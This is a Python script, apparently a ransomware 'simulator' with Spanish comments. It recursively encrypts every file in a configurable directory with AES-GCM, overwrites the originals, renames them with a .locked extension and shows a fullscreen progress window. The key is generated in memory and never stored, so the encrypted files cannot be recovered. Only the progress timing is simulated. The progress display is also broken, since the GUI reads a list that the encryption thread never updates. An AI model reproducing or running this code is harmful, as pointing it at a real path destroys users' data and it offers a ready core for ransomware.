import os
import random
import time
from pathlib import Path
import threading
import tkinter as tk
from tkinter import ttk
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# CONFIGURACION
SANDBOX_DIR = Path(r"C:\ransom_sandbox")  # Cambia a tu ruta
FILES_PER_CYCLE = 10
EXT = ".locked"

# Clave de sesión
MASTER_KEY = AESGCM.generate_key(bit_length=256)
aesgcm = AESGCM(MASTER_KEY)

# Listar candidatos
def list_candidate_files(base_dir):
    files = []
    for root, dirs, filenames in os.walk(base_dir):
        for f in filenames:
            full = Path(root) / f
            if not str(full).endswith(EXT):
                files.append(full)
    return files

# Encriptar archivo (simulación con progreso)
def encrypt_file(path: Path, progress_var, file_index):
    try:
        total_steps = random.randint(20, 50)  # Simulación de tiempo de cifrado
        for i in range(total_steps + 1):
            time.sleep(0.05)  # Simula proceso
            progress_var[file_index] = int((i / total_steps) * 100)
        data = path.read_bytes()
        nonce = os.urandom(12)
        ct = aesgcm.encrypt(nonce, data, None)
        payload = nonce + ct
        path.write_bytes(payload)
        new_name = str(path) + EXT
        path.rename(new_name)
        return True
    except Exception as e:
        print(f"[ERROR cifrar] {path}: {e}")
        return False

# Hilo principal de encriptación
def start_encryption():
    files = list_candidate_files(SANDBOX_DIR)
    total_files = len(files)
    progress_var = [0] * total_files
    encrypted_count = [0]

    for idx, file in enumerate(files):
        encrypt_file(file, progress_var, idx)
        encrypted_count[0] += 1

    # Finalizar
    status_label.config(text="Encriptación completada")

# Actualizar GUI en tiempo real
def update_ui():
    files = list_candidate_files(SANDBOX_DIR)
    total_files = len(files)
    # Actualiza lista de archivos
    listbox.delete(0, tk.END)
    for idx, file in enumerate(files):
        perc = progress_values[idx] if idx < len(progress_values) else 0
        listbox.insert(tk.END, f"{file.name} - {perc}%")

    # Porcentaje global
    if total_files > 0:
        global_progress = int(sum(progress_values) / (total_files))
        progress_bar['value'] = global_progress
        percent_label.config(text=f"{global_progress}%")
    root.after(100, update_ui)

# Inicializar ventana
root = tk.Tk()
root.title("Simulador de Cifrado")
root.attributes('-fullscreen', True)

frame = tk.Frame(root)
frame.pack(expand=True, fill="both", padx=20, pady=20)

# Lista de archivos
listbox = tk.Listbox(frame, font=("Consolas", 14))
listbox.pack(side="top", fill="both", expand=True)

# Barra de progreso global
progress_bar = ttk.Progressbar(frame, orient="horizontal", length=400, mode="determinate")
progress_bar.pack(pady=20)

percent_label = tk.Label(frame, text="0%", font=("Arial", 20, "bold"))
percent_label.pack()

status_label = tk.Label(frame, text="Iniciando...", font=("Arial", 16))
status_label.pack(pady=10)

# Variables de progreso
progress_values = [0] * len(list_candidate_files(SANDBOX_DIR))

# Lanzar en un hilo para no congelar la interfaz
threading.Thread(target=start_encryption, daemon=True).start()

# Actualizar interfaz
update_ui()

root.mainloop()
